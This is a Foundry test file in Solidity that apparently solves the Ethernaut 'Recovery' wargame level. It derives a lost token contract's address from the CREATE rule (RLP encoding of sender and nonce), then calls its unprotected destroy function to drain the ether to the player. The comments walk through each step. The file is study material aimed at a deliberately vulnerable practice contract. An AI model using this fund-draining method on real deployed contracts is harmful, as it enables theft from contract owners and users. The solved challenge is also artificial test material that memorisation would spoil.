// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Recovery, SimpleToken} from "../../src/17/Recovery.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {RecoveryFactory} from "src/17/RecoveryFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract RecoveryTest is Test, BaseTest {
    Recovery public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new RecoveryFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        // Need to recover the deployment address
        instanceContract = Recovery(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function testCheckInstanceRecovery() public {
        vm.startPrank(player, player);

        uint8 nonce = 1; // nonce < 128
        address sender = instance; // Recovery instance
        bytes memory rlp_encode = abi.encodePacked(uint8(0xd6), uint8(0x94), sender, nonce);
        address simpleTokenInstance = payable(address(uint160(uint256(keccak256(rlp_encode)))));

        assertEq(RecoveryFactory(levelFactory).lostAddress(instance), simpleTokenInstance);

        vm.stopPrank();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        // The idea here is to recover the address of the SimpleToken instance created by the Recovery contract
        // Before recovering all the funds in it
        // According to the ethereum yellow paper CREATE opcode has a simple logic to deterministically get the address
        // According to the ethereum Yellow paper (page 10, section 7):
        // "The address of the new account is defined as being the
        // rightmost 160 bits of the Keccak-256 hash of the RLP
        // encoding of the structure containing only the sender and
        // the account nonce. For CREATE2 the rule is different and
        // is described in EIP-1014 by Buterin [2018]"
        // https://ethereum.github.io/yellowpaper/paper.pdf
        // More about create : https://docs.openzeppelin.com/cli/2.8/deploying-with-create2#create

        // More about RLP encoding :
        // https://ethereum.github.io/yellowpaper/paper.pdf#page=19
        // https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/

        uint8 nonce = 1; // The nonce (of a contract) increases with every contract creation and starts from 1. Here the nonce value < 128 and its length = 1. It has to be declared as uint8 so that the concatenation only considers the 1 byte of data. (if declared as a uint256 it will be concatenated like this 0x0000000000000000000000000000000000000000000000000000000000000001). The length of a uint256 is # 1
        address sender = instance; // This is the Recovery instance itself that has created the SimpleToken contract
        // The rule is to rlp encode the structure containing the sender and the nonce. Since this is a sequence, the first step is to RLP encode each element:
        // RLP(sender) = (128 + 20).Sender = 148.Sender = [0x94,Sender]
        // RLP(nonce) = 0x01
        // Then the sequence
        // RLP([sender,nonce]) = (192 + 22).RLP(sender).RLP(nonce) = [0xd6, 0x94, Sender, 0x01]
        // IMPORTANT the prefix is always a sum of a length and some other value and has always a length of EXACTLY 1 BYTE. Thess values have thus to be typecasted into uint8.
        bytes memory rlp_encode = abi.encodePacked(uint8(0xd6), uint8(0x94), sender, nonce);

        // Very Important ! The rule says that the address of the new account is defined as being the
        // RIGHTMOST 160 bits of the Keccak-256 hash of the RLP encoding. The way to do this is to typecast into uint160 and not bytes20
        // Example hash : 0xd49b844ffe4d4f7947fb493c9f60d0d15bac9b8d5c4eae4c830f6754a8b2d7bc
        //      bytes20 : 0xd49b844ffe4d4f7947fb493c9f60d0d15bac9b8d
        //      uint160 :                         0x9f60d0d15bac9b8d5c4eae4c830f6754a8b2d7bc
        address payable simpleTokenInstance = payable(address(uint160(uint256(keccak256(rlp_encode)))));

        // Destroy the contract and recover the funds
        SimpleToken(simpleTokenInstance).destroy(payable(player));

        assert(simpleTokenInstance.balance == 0);

        vm.stopPrank();
    }
}
